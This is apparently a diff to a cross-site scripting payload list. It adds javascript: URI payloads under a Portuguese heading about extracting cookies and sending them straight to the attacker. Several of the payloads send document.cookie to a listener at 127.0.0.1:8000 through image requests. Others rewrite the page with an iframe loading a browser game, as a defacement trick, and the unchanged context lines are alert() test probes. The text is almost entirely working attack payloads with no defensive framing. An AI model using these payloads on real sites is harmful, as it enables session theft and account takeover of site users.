@@ -5,3 +5,23 @@
 <style onload=alert()>
 <img src=x onerror=alert(1)>
 <img/src=x/onerror=alert(1)>
+
+
+
+
+
+[+][+][+]      Após o sucesso da execução!!!!    [+][+][+]
+
+
+Extrair cookies e manda-los diretamente para o atacante: 
+javascript:image = new Image(); image.src='http://127.0.0.1:8000?cookies='%2bdocument.cookie
+
+Space Invaders
+javascript:document.write%3D'<iframe src%3Dhttps:%2F%2Ffunhtml5games.com%2Fspaceinvaders%2Findex.html%20 width%3D800 height%3D700>'
+
+On/Off
+
+javascript:document.write='<iframe src=https://js13kgames.com/games/onoff/index.html  width=700 height=700>''
+%09javascript:document.write%3d%27%253cimg%20src=%22http://127.0.0.1:8000?cookie=%27%20%2b%20document.cookie%20%2b%20%27%22%20/%253e%27
+%09javascript:document.write='<img src="http://127.0.0.1:8000?cookie=' %2b document.cookie %2b '" />'
+%09javascript:document.write='<img src=x onerror=this.src='http://127.0.0.1:8000/?c='%2bdocument.cookie'" />'
